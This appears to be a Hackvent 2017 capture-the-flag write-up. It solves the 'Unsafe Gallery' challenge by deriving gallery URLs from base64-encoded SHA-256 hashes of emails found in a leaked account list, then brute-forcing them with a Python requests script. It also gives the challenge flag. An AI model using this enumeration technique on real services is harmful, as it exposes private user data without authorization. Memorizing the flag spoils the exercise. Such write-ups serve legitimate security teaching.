---
layout: writeup
title: 'Dec 15: Unsafe Gallery'
level:
difficulty:
points:
categories: []
tags: []
flag: HV17-el2S-0Td5-XcFi-6Wjg-J5aB

---

*See pictures you shouldn't see*

## Challenge

The List of all Users of the Unsafe Gallery was leaked (See account
list).
With this list the URL to each gallery can be constructed. E.g. you find
Danny's gallery here.

Now find the flag in Thumper's gallery.

[account list](writeupfiles/accounts.csv)

like to Danny's gallery:
http://challenges.hackvent.hacking-lab.com:3958/gallery/bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw

## Solution

The file is a csv file with user information:

    id,prename,name,address,zip,city,email,crmId,memberType,pictureCount,galleryCount,mbUsed,logCorrelationId,advertisingId,state
    0,Ethan,McCullough,1259 Arborwood Circle,27299,Manchester,Ethan.McCullough@mccullough.com,12739789,silver,26,1,77,19591907,1,disabled
    1,Vivian,Parsons,1222 Basin Way,49195,Byromville,Vivian.Parsons@gmx.com,24818112,platin,25,1,71,14903484,7,active
    2,Kaitlyn,Wells,1547 Kinzel Station,44404,Gibson,K.Wells@sunflower.org,2024240,platin,28,1,77,98402385,14,active
    3,Dakota,Hayes,1709 Akron Trail,3063,Morrow,Dakota.Hayes@sunflower.org,98938964,gold,29,1,76,60973407,21,active
    [..]

The gallery ID could be some hash of this information, lets extract all
the Dannys and Thumpers:

    $ cat accounts.csv | grep -i danny > danny.csv
    $ cat accounts.csv | grep -i thumper > thumper.csv
{: .language-bash}

There are several Dannys in the list:

    28,Danny,Gomez,446 Richards Ridge,67398,Dudley,Danny.Gomez@sunflower.org,4334991,silver,16,1,47,37880231,139,active
    981,Danny,Head,1783 Layton Crescent,10838,Hartwell,Danny.Head@head.com,8090609,platin,7,1,17,96695095,3988,active
    1411,Danny,Brewer,827 Emily Way,85285,Ochlocknee,Danny.Brewer@brewer.com,64452336,platin,17,1,46,58734130,5718,active
    2352,Danny,Snider,1642 Warner Ridge,56674,Sycamore,D.Snider@gmail.com,58043840,platin,23,1,68,2417293,9466,active
    2406,Danny,Douglas,1497 Rondayle Ridge,27656,Gumbranch,Danny.Douglas@douglas.com,97224940,platin,10,1,28,78423462,9693,active

    [..]

    43038,Danny,Mack,1441 Brill Drive,59015,Osterfield,Danny.Mack@mack.com,56888336,platin,15,1,44,72043133,172729,disabled
    43653,Danny,Parrish,509 Jackson Ln,24360,Mcintosh,Danny.Parrish@mail.com,91465682,silver,19,1,48,52326262,175200,active
    43685,Danny,Hardy,1490 Wall Boulevard,83314,Twin Peaks,Danny.Hardy@mail.com,58905278,gold,15,1,41,35615663,175324,disabled
    43736,Danny,Ayala,853 Marlo Heights,60736,Fargo,Danny.Ayala@ayala.com,73601184,gold,28,1,73,46364233,175558,active

And one of these would appear to translate to
`bncqYuhdQVey9omKA6tAFi4rep1FDRtD4H8ftWiw` as the Gallery ID in some
way.

If we go to `/gallery` we get the message `Please use the link you got
in in the registration email or register first`
so it would make sense that the hash is based only on information
present at registration time, email would make most sense

The hash looks base64 encode, if we decode it is
`0x6e772a62e85d4157b2f6898a03ab40162e2b7a9d450d1b43e07f1fb568b0` in hex,
so
let's see if one of the email addresses translates to this when hashed..
the hash is 60 hex digits long, hmm, an odd length..

After a LOT of trial and error, we discover that while none of the email
addresses result in this hash, we see that one almost does
when SHA-256 hashed:

    >>> import hashlib
    >>> email = 'Danny.Dixon@sunflower.org'
    >>> m = hashlib.sha256()
    >>> m.update(email)
    >>> m.hexdigest()
    '6e772a62e85d4157b2f6898a03ab40162e2b7a9d7e143f91b43e07ffc7ed5a2c'
    >>> import base64
    >>> base64.b64encode(m.digest())
    'bncqYuhdQVey9omKA6tAFi4rep1+FD+RtD4H/8ftWiw='
{: .language-python}

Aha! so it is base64 encoded SHA-256 hash, but with non-alphanumeric
characters removed..

Now that we know the recipe, let's repeat it for all the Thumpers in the
list and see we can find
flags in their galleries.

    import base64
    import csv
    import hashlib
    import requests


    infile = 'thumper.csv'

    with open(infile, 'rb') as csvfile:
         reader = csv.reader(csvfile)
         userinfo = list(reader)

    for user in userinfo:
        email = user[6]

        # sha
        m = hashlib.sha256()
        m.update(email)
        sha = m.digest()

        # b64
        b = base64.b64encode(sha)
        # remove non-alphanumeric characters
        b2 = b.replace('=','').replace('+','').replace('/','')

        # test link
        url = 'http://challenges.hackvent.hacking-lab.com:3958/gallery/'+b2
        r = requests.get(url)
        if 'HV17' in r.text:
            print(r.text)
{: .language-python}

This finds us a hit at
http://challenges.hackvent.hacking-lab.com:3958/gallery/37qKYVMANnIdJ2V2EDberGmMz9JzS1pfRLVWaIKuBDw
\:

    [..]

    <div class="col-sm-6 col-md-4">
        <div class="thumbnail">
            <a class="lightbox" href="37qKYVMANnIdJ2V2EDberGmMz9JzS1pfRLVWaIKuBDw//timages/flag.jpg">
                <img src="37qKYVMANnIdJ2V2EDberGmMz9JzS1pfRLVWaIKuBDw//timages/flag.jpg" alt="C'YOU" />
            </a>
            <div class="caption">
                <h3>C'YOU</h3>
                <p>See you next spring at @HackyEaster. I count on you. HV17-el2S-0Td5-XcFi-6Wjg-J5aB</p>
            </div>
        </div>
    </div>

    [..]
{: .language-html}

![](writeupfiles/day15.png)

